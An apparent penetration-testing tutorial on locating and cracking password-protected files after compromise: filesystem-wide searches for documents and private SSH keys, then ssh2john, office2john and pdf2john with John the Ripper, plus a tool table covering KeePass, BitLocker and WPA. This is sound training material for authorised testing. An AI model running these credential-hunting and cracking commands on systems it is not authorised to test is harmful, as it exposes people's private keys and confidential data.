# Cracking Protected Files

Password-protected files are a frequently overlooked but highly valuable target during post-exploitation. Encrypted documents, SSH keys, and compressed archives found on a compromised system often contain credentials, private keys, or sensitive data that can accelerate lateral movement. The EU's [General Data Protection Regulation (GDPR)](https://gdpr-info.eu/issues/encryption/) encourages encryption of personal data both at rest and in transit, yet in practice many organisations still transmit sensitive files as unencrypted email attachments, and where encryption is applied, weak or reused passphrases frequently undermine the protection it was meant to provide.

## Hunting for Encrypted Files

Before cracking anything, the first task is to locate candidate files on the compromised system. Encrypted files do not always carry obvious extensions, so hunting requires a combination of extension-based searches and content-based pattern matching.

For common document and spreadsheet formats, a loop across extensions is an effective approach:

```bash
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*"); do
    echo -e "\nFile extension: " $ext
    find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done
```

Files like SSH private keys carry no standard extension, but they do have consistent, predictable header values. `grep` with a regex pattern can scan the filesystem recursively for these:

```bash
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null

/home/jsmith/.ssh/id_ed25519:1:-----BEGIN OPENSSH PRIVATE KEY-----
/home/jsmith/.ssh/SSH.private:1:-----BEGIN RSA PRIVATE KEY-----
/home/jsmith/Documents/id_rsa:1:-----BEGIN OPENSSH PRIVATE KEY-----
```

## Identifying Encrypted SSH Keys

With older PEM-format RSA keys, the presence of a passphrase is visible directly in the file header:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2109D25CC91F8DBFCEB0F7589066B2CC
```

The `Proc-Type: 4,ENCRYPTED` and `DEK-Info` lines explicitly indicate encryption and identify the cipher and IV used. Modern OpenSSH keys produced with `ssh-keygen` since OpenSSH 6.5 use a different format and do not expose this information in the header — the file looks identical whether or not a passphrase was set. The reliable way to check is to attempt to extract the public key with `ssh-keygen -yf`:

```bash
# Unencrypted key — outputs the public key immediately
ssh-keygen -yf ~/.ssh/id_ed25519
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIpNefJd834VkD5iq+22Zh59Gzmmtzo6rAffCx2UtaS6

# Encrypted key — prompts for a passphrase
ssh-keygen -yf ~/.ssh/id_rsa
Enter passphrase for "/home/jsmith/.ssh/id_rsa":
```

## Cracking Encrypted SSH Keys

The `ssh2john` tool extracts a crackable hash from a passphrase-protected SSH private key and outputs it in a format JtR can process:

```bash
ssh2john SSH.private > ssh.hash
john --wordlist=rockyou.txt ssh.hash
```

```
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
1234         (SSH.private)
1g 0:00:00:00 DONE
Session completed
```

The `Cost 1` field identifies the KDF (Key Derivation Function) used to protect the key. A value of `0` means MD5/AES, which is the weakest and fastest to crack. A value of `2` means bcrypt/AES, which is significantly more expensive and will dramatically reduce cracking throughput. Once cracked, the passphrase can be confirmed:

```bash
john ssh.hash --show
SSH.private:1234
```

Note that JtR's SSH format may emit false positives in some cases, so it continues running even after finding a candidate. If the cracked passphrase does not work when actually using the key, this is likely the cause — rerun with `--show` to review all candidates found.

## Cracking Password-Protected Office Documents

Microsoft Office documents encrypted with a password can be processed with `office2john.py`, which supports `.docx`, `.xlsx`, `.pptx`, and their legacy `.doc`, `.xls`, `.ppt` counterparts. The encryption implementation used by modern Office formats (ECMA-376 / OOXML) is AES-based and is handled by the `office2john` hash extraction and JtR's `office` format.

```bash
office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
john protected-docx.hash --show

Protected.docx:1234
1 password hash cracked, 0 left
```

## Cracking Password-Protected PDFs

PDF password protection uses a separate extraction tool but follows exactly the same workflow. PDF encryption uses either RC4 (legacy, very fast to crack) or AES (modern, slower) depending on the PDF version and the application that created it. `pdf2john.py` handles extraction for both:

```bash
pdf2john.py PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash
john pdf.hash --show

PDF.pdf:1234
1 password hash cracked, 0 left
```

## File Type to Tool Mapping

The full general workflow for any protected file is:

```bash
<conversion_tool> <protected_file> > output.hash
john --wordlist=<wordlist> output.hash
```

| File Type | Extraction Tool | Notes |
|---|---|---|
| SSH private key | `ssh2john` | Supports RSA, DSA, EC, and OpenSSH formats |
| Microsoft Office | `office2john.py` | Covers `.doc`, `.docx`, `.xls`, `.xlsx`, `.ppt`, `.pptx` |
| PDF | `pdf2john.py` | Supports RC4 and AES encrypted PDFs |
| ZIP archive | `zip2john` | Handles PKZIP and WinZip encryption |
| RAR archive | `rar2john` | Supports RAR3 and RAR5 formats |
| 7-Zip archive | `7z2john.pl` | Supports AES-256 encrypted 7z archives |
| KeePass database | `keepass2john` | Supports KeePass 1.x and 2.x `.kdbx` files |
| GPG private key | `gpg2john` | Extracts hash from passphrase-protected GPG keys |
| PuTTY private key | `putty2john` | Supports `.ppk` format |
| BitLocker volume | `bitlocker2john` | Extracts hash from BitLocker-encrypted drives |
| WPA/WPA2 handshake | `wpapcap2john` | Converts captured `.pcap` files for cracking |

## Practical Considerations

Document cracking is increasingly valuable during engagements as employees are more commonly required to encrypt sensitive files before sharing them. A password-protected spreadsheet or PDF found on a file server, in a user's home directory, or in an email attachment can contain credentials, network diagrams, HR data, or financial information that would not otherwise be accessible.

The primary limiting factor is cracking speed. AES-256-encrypted documents such as modern `.docx` and `.xlsx` files use thousands of PBKDF2 iterations internally, which limits cracking throughput to hundreds or low thousands of candidates per second even on modern hardware. This makes targeted, OSINT-informed wordlists and carefully chosen rule sets far more important for file cracking than they are for faster hash types like NTLM or MD5. Generic wordlist attacks against well-encrypted documents are unlikely to succeed within a practical engagement timeframe unless the passphrase is genuinely weak or drawn directly from a known wordlist.
